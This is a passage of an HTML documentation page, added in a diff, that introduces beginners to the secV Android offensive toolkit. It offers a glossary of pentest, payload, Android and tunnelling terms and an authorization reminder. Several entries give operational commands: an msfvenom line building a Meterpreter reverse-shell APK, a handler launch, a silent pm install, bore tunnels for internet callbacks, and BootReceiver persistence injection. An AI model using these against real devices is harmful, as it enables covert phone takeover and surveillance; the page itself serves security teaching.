@@ -1,0 +1,1744 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Foundations — secV Start Here</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+:root {
+  --black:#080808; --deep:#0e0e0e; --pit:#141414; --slab:#1a1a1a;
+  --wall:#222; --crack:#2e2e2e; --stone:#3a3a3a; --dust:#555;
+  --fog:#888; --ash:#bbb; --white:#f0ede6;
+  --green:#4ade80; --green-dim:#1a3a24;
+  --amber:#fbbf24; --amber-dim:#3a2a05;
+  --blue:#60a5fa; --blue-dim:#0f1f3a;
+  --purple:#c084fc; --purple-dim:#2a1040;
+  --red:#f87171; --red-dim:#3a0f0f;
+  --disp:'Bebas Neue',sans-serif;
+  --mono:'Space Mono',monospace;
+  --r:10px; --r-sm:6px; --bw:2px;
+}
+body { font-family:var(--mono); background:var(--black); color:var(--ash); line-height:1.7; overflow-x:hidden; }
+body::before {
+  content:''; position:fixed; inset:0; z-index:999; pointer-events:none;
+  background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.045'/%3E%3C/svg%3E");
+  background-size:256px; opacity:.55; mix-blend-mode:overlay;
+}
+::-webkit-scrollbar{width:3px} ::-webkit-scrollbar-track{background:var(--black)} ::-webkit-scrollbar-thumb{background:var(--stone);border-radius:2px}
+
+nav {
+  position:fixed; top:12px; left:50%; transform:translateX(-50%);
+  width:calc(100% - 3rem); max-width:1100px; z-index:500; height:52px;
+  display:flex; align-items:center; justify-content:space-between;
+  padding:0 1.5rem; border:var(--bw) solid var(--wall);
+  background:rgba(8,8,8,0.92); backdrop-filter:blur(16px);
+  border-radius:var(--r); transition:border-color .22s ease;
+}
+nav.scrolled { border-color:var(--ash); }
+.logo { font-family:var(--disp); font-size:1.4rem; letter-spacing:.06em; color:var(--white); text-decoration:none; display:flex; align-items:center; gap:.5rem; }
+.logo-sq { width:8px; height:8px; background:var(--green); transform:rotate(45deg); animation:spin-sq 4s linear infinite; flex-shrink:0; }
+@keyframes spin-sq { to { transform:rotate(405deg); } }
+.nav-links { display:flex; align-items:center; gap:2px; }
+.nav-link { font-size:.5rem; letter-spacing:.16em; text-transform:uppercase; color:var(--dust); text-decoration:none; padding:.4rem .75rem; border-radius:var(--r-sm); transition:color .12s,background .12s; }
+.nav-link:hover { color:var(--ash); background:rgba(255,255,255,0.06); }
+.nav-cta { font-size:.5rem; letter-spacing:.16em; text-transform:uppercase; color:var(--black); background:var(--green); text-decoration:none; padding:.4rem 1rem; margin-left:.5rem; font-weight:700; border-radius:var(--r-sm); transition:background .12s; }
+.nav-cta:hover { background:#86efac; }
+
+.hero { padding:9rem 2.5rem 4rem; max-width:1100px; margin:0 auto; }
+.breadcrumb { display:flex; align-items:center; gap:.6rem; font-size:.5rem; letter-spacing:.2em; text-transform:uppercase; color:var(--dust); margin-bottom:2.5rem; flex-wrap:wrap; }
+.breadcrumb a { color:var(--dust); text-decoration:none; transition:color .12s; }
+.breadcrumb a:hover { color:var(--ash); }
+.breadcrumb-sep { color:var(--wall); }
+.hero-badge { display:inline-flex; align-items:center; gap:.5rem; background:var(--green-dim); border:1px solid rgba(74,222,128,.3); color:var(--green); font-size:.5rem; letter-spacing:.18em; text-transform:uppercase; padding:.3rem .8rem; border-radius:var(--r-sm); margin-bottom:1.5rem; }
+.hero-badge::before { content:''; width:6px; height:6px; border-radius:50%; background:var(--green); animation:pulse-g 1.8s ease infinite; }
+@keyframes pulse-g { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:.4;transform:scale(.8)} }
+h1 { font-family:var(--disp); font-size:clamp(4rem,9vw,8rem); line-height:.9; letter-spacing:.02em; color:var(--white); margin-bottom:1.25rem; text-shadow:1px 1px 0 var(--stone),2px 2px 0 var(--stone),4px 4px 0 rgba(40,40,40,.5),7px 7px 15px rgba(0,0,0,.9); }
+h1 em { font-style:normal; color:var(--green); display:block; font-size:.45em; letter-spacing:.1em; text-shadow:none; }
+.hero-sub { font-size:.76rem; color:var(--fog); max-width:620px; line-height:1.9; margin-bottom:2rem; }
+
+hr.rule { border:none; border-top:var(--bw) solid var(--wall); margin:0 2.5rem; }
+.wrap { max-width:1100px; margin:0 auto; padding:4rem 2.5rem; }
+
+.section-label { display:flex; align-items:center; gap:1rem; margin-bottom:1.25rem; }
+.section-num { font-family:var(--disp); font-size:.75rem; color:var(--green); letter-spacing:.2em; min-width:2rem; }
+.section-label span:nth-child(2) { font-size:.48rem; letter-spacing:.25em; text-transform:uppercase; color:var(--dust); }
+.section-line { flex:1; height:var(--bw); background:var(--wall); }
+h2 { font-family:var(--disp); font-size:clamp(2.2rem,4vw,3.5rem); color:var(--white); margin-bottom:2rem; letter-spacing:.04em; }
+h2 .h2-alt { color:var(--green); }
+h3 { font-size:.72rem; font-weight:700; color:var(--white); letter-spacing:.06em; margin-bottom:1rem; text-transform:uppercase; }
+
+/* ─── PROGRESS PATH ─── */
+.path-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:1rem; margin-bottom:3rem; }
+.path-step { background:var(--pit); border:var(--bw) solid var(--wall); border-radius:var(--r); padding:1.4rem; position:relative; transition:border-color .18s,transform .18s; }
+.path-step:hover { border-color:var(--green); transform:translateY(-3px); }
+.path-step.active { border-color:rgba(74,222,128,.5); background:var(--green-dim); }
+.path-num { font-family:var(--disp); font-size:2.5rem; color:var(--wall); line-height:1; margin-bottom:.6rem; transition:color .18s; }
+.path-step.active .path-num { color:rgba(74,222,128,.4); }
+.path-step:hover .path-num { color:var(--stone); }
+.path-title { font-size:.68rem; font-weight:700; color:var(--white); margin-bottom:.4rem; }
+.path-desc { font-size:.6rem; color:var(--fog); line-height:1.7; }
+.path-link { display:inline-flex; align-items:center; gap:.4rem; font-size:.54rem; color:var(--green); text-decoration:none; margin-top:.8rem; letter-spacing:.06em; }
+.path-link:hover { text-decoration:underline; }
+
+/* ─── GLOSSARY ─── */
+.gloss-section { margin-bottom:3rem; }
+.gloss-cat-header { display:flex; align-items:center; gap:1rem; margin-bottom:1.2rem; }
+.gloss-cat-dot { width:8px; height:8px; border-radius:2px; flex-shrink:0; }
+.gloss-cat-name { font-size:.52rem; letter-spacing:.2em; text-transform:uppercase; font-weight:700; }
+.gloss-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(260px,1fr)); gap:.75rem; }
+.gloss-card { background:var(--pit); border:1px solid var(--wall); border-radius:var(--r-sm); padding:1rem 1.1rem; transition:border-color .15s; }
+.gloss-card:hover { border-color:var(--stone); }
+.gloss-term { font-size:.64rem; font-weight:700; color:var(--white); margin-bottom:.35rem; }
+.gloss-abbr { font-size:.52rem; color:var(--dust); margin-left:.4rem; }
+.gloss-def { font-size:.6rem; color:var(--fog); line-height:1.75; }
+.gloss-def code { font-family:var(--mono); font-size:.56rem; background:var(--slab); border:1px solid var(--wall); padding:.02rem .25rem; border-radius:3px; color:var(--ash); }
+.gloss-def .tag-imp { color:var(--amber); }
+.gloss-def .tag-warn { color:var(--red); }
+
+/* ─── PREREQUISITE CHECKLIST ─── */
+.prereq-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(300px,1fr)); gap:1rem; margin-bottom:2rem; }
+.prereq-card { background:var(--pit); border:var(--bw) solid var(--wall); border-radius:var(--r); padding:1.2rem 1.4rem; }
+.prereq-card-title { font-size:.64rem; font-weight:700; color:var(--white); margin-bottom:.8rem; display:flex; align-items:center; gap:.5rem; }
+.prereq-card-title .dot { width:6px; height:6px; border-radius:50%; }
+.prereq-list { list-style:none; }
+.prereq-list li { font-size:.6rem; color:var(--fog); line-height:1.8; padding:.15rem 0; padding-left:1.2rem; position:relative; }
+.prereq-list li::before { content:'▸'; position:absolute; left:0; color:var(--stone); }
+.prereq-list li code { font-family:var(--mono); font-size:.56rem; background:var(--slab); border:1px solid var(--wall); padding:.02rem .25rem; border-radius:3px; color:var(--ash); }
+.prereq-list li strong { color:var(--ash); }
+
+/* ─── FIRST RUN GUIDE ─── */
+.steps { list-style:none; }
+.step-item { display:grid; grid-template-columns:2.5rem 1fr; gap:1rem; padding:1.4rem 0; border-bottom:1px solid var(--wall); }
+.step-item:last-child { border-bottom:none; }
+.step-num { font-family:var(--disp); font-size:1.6rem; color:var(--green); line-height:1; padding-top:.15rem; }
+.step-content {}
+.step-title { font-size:.66rem; font-weight:700; color:var(--white); margin-bottom:.35rem; text-transform:uppercase; letter-spacing:.05em; }
+.step-body { font-size:.62rem; color:var(--fog); line-height:1.8; }
+.step-body code { font-family:var(--mono); font-size:.58rem; background:var(--slab); border:1px solid var(--crack); padding:.1rem .3rem; border-radius:3px; color:var(--ash); }
+pre.step-code { background:var(--pit); border:1px solid var(--crack); border-radius:var(--r-sm); padding:1rem 1.2rem; margin-top:.7rem; font-family:var(--mono); font-size:.6rem; color:var(--ash); overflow-x:auto; line-height:1.7; }
+pre.step-code .cm { color:var(--dust); }
+pre.step-code .hl { color:var(--green); }
+
+/* ─── MODULE QUICKSTART TABLE ─── */
+.qs-table-wrap { overflow-x:auto; margin-bottom:2rem; }
+.qs-table { width:100%; border-collapse:collapse; font-size:.6rem; }
+.qs-table th { background:var(--slab); color:var(--ash); font-weight:700; text-transform:uppercase; letter-spacing:.12em; font-size:.5rem; padding:.7rem 1rem; border:1px solid var(--wall); text-align:left; }
+.qs-table td { padding:.65rem 1rem; border:1px solid var(--wall); color:var(--fog); vertical-align:top; }
+.qs-table tr:hover td { background:var(--pit); }
+.qs-table td:first-child { color:var(--white); font-weight:700; white-space:nowrap; }
+.qs-table td a { color:var(--blue); text-decoration:none; }
+.qs-table td a:hover { text-decoration:underline; }
+.diff-badge { display:inline-block; font-size:.46rem; letter-spacing:.1em; text-transform:uppercase; padding:.15rem .5rem; border-radius:3px; font-weight:700; }
+.diff-1 { background:var(--green-dim); color:var(--green); border:1px solid rgba(74,222,128,.3); }
+.diff-2 { background:var(--amber-dim); color:var(--amber); border:1px solid rgba(251,191,36,.3); }
+.diff-3 { background:var(--red-dim); color:var(--red); border:1px solid rgba(248,113,113,.3); }
+
+/* ─── WARNING BOXES ─── */
+.warn-box { background:var(--amber-dim); border:var(--bw) solid rgba(251,191,36,.35); border-radius:var(--r); padding:1.2rem 1.4rem; font-size:.63rem; color:var(--amber); line-height:1.8; margin:1.5rem 0; }
+.warn-box strong { color:var(--amber); }
+.info-box { background:var(--blue-dim); border:var(--bw) solid rgba(96,165,250,.35); border-radius:var(--r); padding:1.2rem 1.4rem; font-size:.63rem; color:var(--blue); line-height:1.8; margin:1.5rem 0; }
+.info-box strong { color:var(--blue); }
+
+/* ─── FOOTER ─── */
+footer { border-top:var(--bw) solid var(--wall); padding:3rem 2.5rem; display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap; gap:1rem; max-width:1100px; margin:0 auto; }
+.footer-logo { font-family:var(--disp); font-size:1.1rem; color:var(--fog); letter-spacing:.06em; }
+.footer-text { font-size:.52rem; color:var(--dust); }
+
+@media(max-width:768px){
+  .hero{padding:8rem 1.5rem 3rem}
+  .wrap{padding:3rem 1.5rem}
+  .path-grid{grid-template-columns:1fr}
+  .gloss-grid{grid-template-columns:1fr}
+  .prereq-grid{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+
+<nav id="nav">
+  <a class="logo" href="index.html">
+    <span class="logo-sq"></span>
+    secV
+    <span style="color:var(--dust);font-family:var(--mono);font-size:.9rem">/</span>
+    <span style="color:var(--fog);font-family:var(--mono);font-size:.65rem;letter-spacing:.1em">DOCS</span>
+  </a>
+  <div class="nav-links">
+    <a class="nav-link" href="index.html">Modules</a>
+    <a class="nav-link" href="foundations.html" style="color:var(--green)">Foundations</a>
+    <a class="nav-cta" href="index.html#modules">Browse Modules →</a>
+  </div>
+</nav>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="breadcrumb">
+    <a href="../../index.html">SecVulnHub</a>
+    <span class="breadcrumb-sep">/</span>
+    <a href="index.html">Docs</a>
+    <span class="breadcrumb-sep">/</span>
+    secV
+    <span class="breadcrumb-sep">/</span>
+    Foundations
+  </div>
+  <div class="hero-badge">Complete Beginner Start Here</div>
+  <h1>Foundation<em>Before You Touch Anything</em></h1>
+  <p class="hero-sub">
+    This page is the entry point for anyone who is new to offensive security, penetration testing,
+    or the secV toolkit. Read it first. It covers every term you will encounter across all modules,
+    what each tool actually does, and how to run your very first operation in under 10 minutes.
+    No prior experience required.
+  </p>
+</div>
+
+<hr class="rule">
+
+<!-- PATH -->
+<div class="wrap">
+  <div class="section-label">
+    <span class="section-num">00</span>
+    <span>Your Learning Path</span>
+    <span class="section-line"></span>
+  </div>
+  <h2>Where To <span class="h2-alt">Start</span></h2>
+
+  <div class="path-grid">
+    <div class="path-step active">
+      <div class="path-num">01</div>
+      <div class="path-title">Read This Page</div>
+      <div class="path-desc">Learn every term in the glossary. Understand what ADB, payload, Meterpreter, and bore mean before running anything.</div>
+    </div>
+    <div class="path-step">
+      <div class="path-num">02</div>
+      <div class="path-title">Set Up Prerequisites</div>
+      <div class="path-desc">Install secV, Metasploit, ADB, apktool, and bore on your attack machine. Everything you need is listed below.</div>
+      <a class="path-link" href="#prereqs">See checklist →</a>
+    </div>
+    <div class="path-step">
+      <div class="path-num">03</div>
+      <div class="path-title">First Run — netrecon</div>
+      <div class="path-desc">Run a basic network scan against your own machine to confirm everything is installed correctly. No target device needed.</div>
+      <a class="path-link" href="#first-run">See guide →</a>
+    </div>
+    <div class="path-step">
+      <div class="path-num">04</div>
+      <div class="path-title">Pick a Module</div>
+      <div class="path-desc">Once comfortable with the basics, dive into a module. Each module page has a Beginner Startup section at the top.</div>
+      <a class="path-link" href="index.html#modules">Browse modules →</a>
+    </div>
+  </div>
+
+  <div class="warn-box">
+    <strong>Legal reminder:</strong> All secV modules are tools for <strong>authorized</strong> penetration testing, security research, and CTF competitions only.
+    Running these tools against systems you do not own or have written permission to test is illegal in most jurisdictions.
+    Always confirm your scope and obtain written authorization before testing.
+  </div>
+</div>
+
+<hr class="rule">
+
+<!-- GLOSSARY -->
+<div class="wrap" id="glossary">
+  <div class="section-label">
+    <span class="section-num">01</span>
+    <span>Glossary</span>
+    <span class="section-line"></span>
+  </div>
+  <h2>Every Term You <span class="h2-alt">Need to Know</span></h2>
+
+  <!-- Category: Penetration Testing Core -->
+  <div class="gloss-section">
+    <div class="gloss-cat-header">
+      <div class="gloss-cat-dot" style="background:var(--green)"></div>
+      <span class="gloss-cat-name" style="color:var(--green)">Penetration Testing — Core Concepts</span>
+    </div>
+    <div class="gloss-grid">
+      <div class="gloss-card">
+        <div class="gloss-term">Penetration Test <span class="gloss-abbr">(Pentest)</span></div>
+        <div class="gloss-def">An authorized simulated attack on a system to find real vulnerabilities before a real attacker does. A pentest has a defined scope, a start/end date, and written permission from the system owner.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Red Team / Blue Team</div>
+        <div class="gloss-def"><span class="tag-imp">Red Team</span> = attackers (you, running secV). <span class="tag-imp">Blue Team</span> = defenders (the security operations center watching for intrusions). Red teams simulate real adversaries to stress-test blue team detection.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">CTF <span class="gloss-abbr">(Capture The Flag)</span></div>
+        <div class="gloss-def">A security competition where participants exploit intentionally vulnerable machines to find hidden "flags" (strings of text). Safe, legal, and a great way to practice. Platforms: TryHackMe, HackTheBox, PicoCTF.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Scope</div>
+        <div class="gloss-def">The defined boundary of a pentest — which IP addresses, domains, and systems are in scope (allowed to test) vs out of scope (off limits). Never test outside scope.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Vulnerability</div>
+        <div class="gloss-def">A weakness in a system that could be exploited — e.g. an unpatched software bug, a misconfiguration, or a default password. Having a vulnerability doesn't mean it's been exploited.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Exploit</div>
+        <div class="gloss-def">Code or technique that takes advantage of a vulnerability to produce an unintended effect on the target system — gaining access, crashing it, or escalating privileges.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">CVE <span class="gloss-abbr">(Common Vulnerabilities &amp; Exposures)</span></div>
+        <div class="gloss-def">A standardized identifier for a known vulnerability. Format: <code>CVE-YEAR-NUMBER</code>. Example: <code>CVE-2023-45866</code> is the Bluetooth HID injection vulnerability patched in December 2023.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">CVSS Score</div>
+        <div class="gloss-def">A 0–10 severity score assigned to a CVE. 0–3.9 = Low, 4–6.9 = Medium, 7–8.9 = High, 9–10 = Critical. Higher = more dangerous and/or easier to exploit.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Zero-Click Exploit</div>
+        <div class="gloss-def">An attack that requires <span class="tag-warn">zero user interaction</span> on the target — no clicks, no taps, no downloads. The most dangerous class of exploit. Example: CVE-2023-45866 injects keystrokes over Bluetooth without pairing.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">One-Click Exploit</div>
+        <div class="gloss-def">An attack that requires <span class="tag-imp">one user action</span> — e.g. tapping a download link, opening a document, or installing an app. Social engineering is usually involved.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Privilege Escalation <span class="gloss-abbr">(LPE / PE)</span></div>
+        <div class="gloss-def">Going from a lower-privilege access (normal user) to a higher-privilege one (root / admin / system). <code>LPE</code> = Local Privilege Escalation (already on the machine). Common next step after initial access.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Attack Surface</div>
+        <div class="gloss-def">All the ways an attacker can potentially reach and interact with a target — open ports, installed apps, Bluetooth, WiFi, USB ports, web APIs. Reducing attack surface = better security posture.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Category: Shells & Payloads -->
+  <div class="gloss-section">
+    <div class="gloss-cat-header">
+      <div class="gloss-cat-dot" style="background:var(--amber)"></div>
+      <span class="gloss-cat-name" style="color:var(--amber)">Shells, Payloads &amp; Access</span>
+    </div>
+    <div class="gloss-grid">
+      <div class="gloss-card">
+        <div class="gloss-term">Shell</div>
+        <div class="gloss-def">A command-line interface on a remote machine that gives you execution control — you type commands, they run on the target. The end goal of most exploits.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Reverse Shell</div>
+        <div class="gloss-def">The <span class="tag-imp">target connects back to you</span> (the attacker). Used when the target is behind a firewall/NAT. You listen on your machine; the payload on the target calls home. Most common shell type in secV.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Bind Shell</div>
+        <div class="gloss-def">The target <span class="tag-imp">opens a port and waits</span> for you to connect. Works when you can reach the target directly (same LAN). Less common — firewalls often block inbound.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Payload</div>
+        <div class="gloss-def">The code delivered to the target that gives you access — the shell, the backdoor, the Meterpreter agent. Generated by <code>msfvenom</code>. Examples: <code>android/meterpreter/reverse_https</code>, <code>linux/x64/shell_reverse_tcp</code>.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Staged vs Stageless Payload</div>
+        <div class="gloss-def"><span class="tag-imp">Staged</span>: small first stage calls back to download the full payload. Smaller initial file but requires callback. <span class="tag-imp">Stageless</span>: everything in one file, no callback. Use stageless (<code>/</code> vs <code>_</code> in msfvenom name) for reliability across firewalls.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Meterpreter</div>
+        <div class="gloss-def">Metasploit's advanced in-memory shell. Runs entirely in RAM (no file written to disk), encrypted, and extensible. Provides file browsing, camera access, keylogging, screen capture, and post-exploitation modules. The default payload in secV's android module.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Handler / Listener</div>
+        <div class="gloss-def">The Metasploit process on your machine that waits for the payload to call back. Run via <code>msfconsole -q -r handler.rc</code>. Must be running before (or as soon as) the payload executes on the target.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">LHOST / LPORT</div>
+        <div class="gloss-def"><code>LHOST</code> = your machine's IP address the payload calls back to. <code>LPORT</code> = the port number your handler listens on. These are baked into the payload at generation time. For WAN delivery, use the bore tunnel IP/port.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">RHOST / RPORT</div>
+        <div class="gloss-def"><code>RHOST</code> = target's IP address. <code>RPORT</code> = target's port you're connecting to. Used for network-side exploits where you connect to the target (rather than waiting for callback).</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Persistence</div>
+        <div class="gloss-def">Ensuring your access survives a reboot or session reset. Techniques: adding a startup service, modifying system files, injecting a BootReceiver into an app. Without persistence, losing the shell means starting over.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">C2 <span class="gloss-abbr">(Command and Control)</span></div>
+        <div class="gloss-def">The infrastructure used to communicate with compromised devices after gaining access — sending commands, receiving output, exfiltrating data. secV's C2 module uses bore WAN tunnels for callback over the internet.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Exfiltration</div>
+        <div class="gloss-def">Extracting data from a compromised system — files, credentials, messages, contacts. The data moves from target to attacker. Common post-exploitation objective.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Category: Android -->
+  <div class="gloss-section">
+    <div class="gloss-cat-header">
+      <div class="gloss-cat-dot" style="background:var(--blue)"></div>
+      <span class="gloss-cat-name" style="color:var(--blue)">Android-Specific</span>
+    </div>
+    <div class="gloss-grid">
+      <div class="gloss-card">
+        <div class="gloss-term">ADB <span class="gloss-abbr">(Android Debug Bridge)</span></div>
+        <div class="gloss-def">A command-line tool for communicating with Android devices from a computer. Enables installing apps, running shell commands, pulling files, and more. Requires USB debugging to be enabled on the device. Most secV operations use ADB.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">APK <span class="gloss-abbr">(Android Package)</span></div>
+        <div class="gloss-def">The installable app file format for Android, equivalent to a Windows <code>.exe</code>. Contains compiled Java bytecode (DEX), resources, and a manifest. secV generates malicious APKs with embedded payloads using <code>msfvenom</code>.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Root / Rooted Device</div>
+        <div class="gloss-def">A device where the operating system's security restrictions have been removed, granting full administrator (<code>root</code>) access. Unlocks the ability to read/write any file on the device. Most powerful but voids warranty. <code>Magisk</code> is the common rooting tool.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Android Security Patch Level</div>
+        <div class="gloss-def">A date string (e.g. <code>2023-12-01</code>) that indicates the latest Google security update applied to the device. Any CVE published before that date should be patched. Check: <code>adb shell getprop ro.build.version.security_patch</code>.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Smali</div>
+        <div class="gloss-def">Human-readable representation of Android's DEX bytecode — the closest thing to assembly for Android apps. <code>apktool</code> decompiles APKs into smali. secV injects <code>BootReceiver.smali</code> into APKs to add persistence.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">BootReceiver</div>
+        <div class="gloss-def">An Android component that runs automatically when the device boots. secV injects one into payload APKs so the Meterpreter shell reconnects every time the device restarts — no re-delivery needed.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Intent</div>
+        <div class="gloss-def">Android's messaging system for starting activities, services, or broadcast receivers. <code>am start -a android.intent.action.VIEW -d URL</code> is how secV opens a download URL on the device via ADB.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">pm <span class="gloss-abbr">(Package Manager)</span></div>
+        <div class="gloss-def">Android CLI tool for installing, uninstalling, and querying apps. <code>pm install -r -t /sdcard/Download/app.apk</code> installs an APK from the device's storage without user confirmation when run via ADB.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Unknown Sources</div>
+        <div class="gloss-def">Android setting that must be enabled (per-app since Android 8) to install APKs from outside the Play Store. secV requires this enabled for the browser to allow APK installs. Check: Settings → Apps → Special App Access → Install unknown apps.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Frida</div>
+        <div class="gloss-def">A dynamic instrumentation toolkit — attaches to a running process and injects JavaScript to modify behavior, bypass checks, or extract data. secV uses Frida + Objection for SSL pinning bypass, root detection bypass, and runtime memory analysis.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">SSL Pinning</div>
+        <div class="gloss-def">An app-level defense where the app only trusts a specific certificate (not just any valid one). Prevents traffic interception with Burp Suite. secV's Frida/Objection module bypasses pinning on rooted devices automatically.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">DEX <span class="gloss-abbr">(Dalvik Executable)</span></div>
+        <div class="gloss-def">The compiled bytecode format that Android runs. Multiple DEX files can exist in one APK (<code>classes.dex</code>, <code>classes2.dex</code>). <code>JADX</code> decompiles DEX back to readable Java. secV's DexClassLoader staging downloads and runs a DEX file at runtime.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Category: Networking -->
+  <div class="gloss-section">
+    <div class="gloss-cat-header">
+      <div class="gloss-cat-dot" style="background:var(--purple)"></div>
+      <span class="gloss-cat-name" style="color:var(--purple)">Networking &amp; Tunnels</span>
+    </div>
+    <div class="gloss-grid">
+      <div class="gloss-card">
+        <div class="gloss-term">LAN vs WAN</div>
+        <div class="gloss-def"><code>LAN</code> = Local Area Network — devices on the same network (your home WiFi, same router). <code>WAN</code> = Wide Area Network — the internet. A reverse shell callback must reach your machine across the WAN if the target is not on your LAN.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">NAT <span class="gloss-abbr">(Network Address Translation)</span></div>
+        <div class="gloss-def">Your router hides your private IP behind one public IP. Incoming connections from the internet can't reach your machine directly. WAN tunnels (bore) solve this — they punch through NAT without port forwarding.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">bore Tunnel</div>
+        <div class="gloss-def">A lightweight TCP tunnel tool used in secV to expose local ports to the internet without port forwarding. <code>bore local 4444 --to bore.pub</code> makes your local port 4444 reachable at <code>bore.pub:RANDOM_PORT</code>. Used for WAN MSF callbacks and APK delivery.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Port / Port Number</div>
+        <div class="gloss-def">A number (0–65535) that identifies a specific process on a networked device. Port 4444 is the Metasploit handler default. Port 80 is HTTP, 443 is HTTPS. <code>LPORT</code> in secV = the port your handler listens on.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">HTTP vs HTTPS</div>
+        <div class="gloss-def"><code>HTTP</code> = unencrypted web traffic (port 80). <code>HTTPS</code> = encrypted (port 443, uses TLS). For reverse shells across the internet, <code>reverse_https</code> payloads blend in with normal HTTPS traffic and pass through firewalls more reliably than raw TCP.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">IP Address</div>
+        <div class="gloss-def">A number that identifies a device on a network. Private (LAN): <code>192.168.x.x</code>, <code>10.x.x.x</code>, <code>172.16–31.x.x</code>. Public (WAN): the address internet traffic uses. <code>LHOST</code> in secV should be your LAN IP for local testing or bore's IP for WAN.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">MAC Address</div>
+        <div class="gloss-def">A hardware identifier burned into every network adapter — format: <code>XX:XX:XX:XX:XX:XX</code>. Unique per device. secV's <code>mac_spoof</code> module randomizes or sets it to avoid device fingerprinting on networks.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">L2CAP <span class="gloss-abbr">(Bluetooth)</span></div>
+        <div class="gloss-def">Logical Link Control and Adaptation Protocol — Bluetooth's layer-2 protocol, analogous to TCP/IP but for Bluetooth. CVE-2023-45866 exploits raw L2CAP sockets connecting to Android's HID channels (PSM 0x11, 0x13) without authentication.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Category: Tools -->
+  <div class="gloss-section">
+    <div class="gloss-cat-header">
+      <div class="gloss-cat-dot" style="background:var(--red)"></div>
+      <span class="gloss-cat-name" style="color:var(--red)">Tools Used by secV</span>
+    </div>
+    <div class="gloss-grid">
+      <div class="gloss-card">
+        <div class="gloss-term">Metasploit Framework <span class="gloss-abbr">(MSF)</span></div>
+        <div class="gloss-def">The industry-standard exploitation framework. Contains hundreds of exploits, payloads, and post-exploitation modules. secV uses <code>msfvenom</code> to generate payloads and <code>msfconsole</code> to run the listener/handler.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">msfvenom</div>
+        <div class="gloss-def">Metasploit's payload generator. Creates APKs, EXEs, scripts, and raw shellcode with your chosen payload/LHOST/LPORT embedded. Example: <code>msfvenom -p android/meterpreter/reverse_https LHOST=x.x.x.x LPORT=4444 -o payload.apk</code>.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">msfconsole</div>
+        <div class="gloss-def">The interactive Metasploit shell. Runs handlers, exploits, and post-exploitation modules. secV generates a <code>handler.rc</code> resource script — run it with <code>msfconsole -q -r handler.rc</code> to start the listener automatically.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">apktool</div>
+        <div class="gloss-def">Decompiles APKs into smali code + resources, lets you modify them, then rebuilds. secV uses it to inject <code>BootReceiver.smali</code> and patch <code>AndroidManifest.xml</code> for persistence. Command: <code>apktool d app.apk -o decoded/</code>.</div>
+      </div>
